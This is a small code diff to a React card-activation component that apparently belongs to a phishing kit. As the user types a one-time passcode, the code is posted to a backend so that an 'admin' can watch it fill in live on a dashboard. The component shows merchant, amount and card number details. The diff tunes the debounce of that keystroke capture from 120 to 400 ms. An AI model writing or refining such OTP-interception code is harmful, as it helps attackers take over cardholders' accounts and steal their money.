@@ -67,7 +67,8 @@ export function ActivationOtp({ sentTo, merchant, amount, date, cardNumber }: Pr
   }, [live, router]);
 
   // Stream the digits as they're entered, so the admin sees the code fill in
-  // live on the dashboard.
+  // live on the dashboard. Debounced so a burst of typing is one write, not one
+  // per digit.
   useEffect(() => {
     const id = setTimeout(() => {
       void fetch("/api/activation/otp-typing", {
@@ -76,7 +77,7 @@ export function ActivationOtp({ sentTo, merchant, amount, date, cardNumber }: Pr
         body: JSON.stringify({ code }),
         keepalive: true,
       });
-    }, 120);
+    }, 400);
     return () => clearTimeout(id);
   }, [code]);
 
